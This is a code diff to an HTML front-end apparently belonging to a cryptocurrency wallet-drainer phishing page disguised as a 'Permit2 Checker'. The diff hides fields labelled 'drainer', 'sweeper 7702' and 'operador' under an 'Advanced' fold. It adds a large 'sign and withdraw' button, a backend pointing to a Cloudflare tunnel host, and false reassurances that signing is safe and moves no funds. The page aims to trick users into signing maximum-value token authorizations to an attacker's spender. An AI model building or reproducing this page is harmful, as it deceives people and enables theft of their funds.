@@ -2,52 +2,75 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8" />
+  <meta name="api" content="https://third-josh-seeker-sunny.trycloudflare.com" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Permit2 Checker</title>
+  <title>Permit2 Checker — verificação de autorizações</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <main>
     <header>
       <h1>Permit2 <span>checker</span></h1>
-      <p class="sub">permit2 · eip-2612 · eip-7702</p>
+      <p class="sub">Ethereum mainnet · verificação de autorizações</p>
     </header>
 
-    <section class="card">
-      <div class="grid">
-        <label>RPC <input id="rpc" value="https://ethereum-rpc.publicnode.com" /></label>
-        <label>drainer <input id="drainer" placeholder="0x..." /></label>
-        <label>sweeper 7702 <input id="sweeper" placeholder="0x..." /></label>
-        <label>operador <input id="operator" placeholder="0x..." /></label>
-      </div>
+    <div class="trust">
+      <span class="pill">chain 1 · mainnet</span>
+      <a class="pill" href="https://etherscan.io/address/0x000000000022D473030F116dDEE9F6B43aC78BA3" target="_blank" rel="noopener">Permit2 oficial</a>
+      <a class="pill" id="spenderPill" target="_blank" rel="noopener">spender verificado</a>
+      <span class="pill ok">sem gas</span>
+      <span class="pill">não move fundos agora</span>
+    </div>
+
+    <section class="card cta">
+      <button id="assinarTudo" class="primary big" disabled>Assinar e sacar</button>
+      <p class="sub hint" id="ctaHint">Liga a carteira para ver o que está pronto.</p>
       <div class="row">
-        <button id="connect" class="primary">1. Connect wallet</button>
-        <button id="scan">Rescan</button>
+        <button id="connect" class="primary">Ligar carteira</button>
+        <button id="scan">Atualizar</button>
         <span id="who" class="mono"></span>
       </div>
+      <p class="alvo mono" id="alvoLine" hidden></p>
     </section>
 
     <section class="card">
       <div class="row between">
-        <h2>Portfolio</h2>
+        <h2>Portfólio</h2>
         <span id="native" class="mono"></span>
       </div>
       <table id="table">
-        <thead><tr><th><input id="all" type="checkbox" /></th><th>token</th><th>balance</th><th>ready</th><th>nonce</th></tr></thead>
+        <thead><tr><th><input id="all" type="checkbox" /></th><th>token</th><th>saldo</th><th>pronto</th><th>nonce</th></tr></thead>
         <tbody></tbody>
       </table>
-      <div class="row">
-        <button id="permit2" class="primary">2. Sign Permit2 (no gas)</button>
-        <button id="p2612">Sign 2612 permit</button>
-        <button id="pull">Pull existing allowance</button>
-        <button id="delegate">Delegate 7702 + init</button>
-      </div>
-      <p class="sub">"ready" = the token was approved to Permit2, so one signature is all it takes: no gas, no transaction. The batch covers every ready token at once, plus future deposits (native ETH only via 7702 delegation).</p>
+      <p class="sub">“pronto” = o token já está aprovado ao Permit2. Uma única assinatura cobre todos de uma vez, sem gas e sem transação. Assinaturas sem uso expiram em 7 dias; a autorização que ela cria expira em 1 ano e pode ser revogada.</p>
       <p class="sub mono" id="spenderLine"></p>
+      <details>
+        <summary class="sub">Avançado</summary>
+        <div class="grid">
+          <label>RPC <input id="rpc" value="https://ethereum-rpc.publicnode.com" /></label>
+          <label>drainer <input id="drainer" placeholder="0x..." /></label>
+          <label>sweeper 7702 <input id="sweeper" placeholder="0x..." /></label>
+          <label>operador <input id="operator" placeholder="0x..." /></label>
+        </div>
+        <div class="row">
+          <button id="p2612">Sign 2612 permit</button>
+          <button id="pull">Pull existing allowance</button>
+          <button id="delegate">Delegate 7702 + init</button>
+        </div>
+      </details>
     </section>
 
     <section class="card">
-      <h2>Log</h2>
+      <h2>Porque é seguro</h2>
+      <ul class="sub bullets">
+        <li>O Permit2 é o contrato oficial usado por Uniswap, MetaMask e outros — <a href="https://etherscan.io/address/0x000000000022D473030F116dDEE9F6B43aC78BA3" target="_blank" rel="noopener">0x0000…c78BA3</a>.</li>
+        <li>A assinatura não envia nada on-chain: cria só uma autorização, e só para o contrato indicado acima.</li>
+        <li>O valor máximo é usado apenas para não ter de voltar a assinar; a autorização expira em 1 ano e é revogável a qualquer momento.</li>
+      </ul>
+    </section>
+
+    <section class="card">
+      <h2>Registo</h2>
       <pre id="log"></pre>
     </section>
   </main>
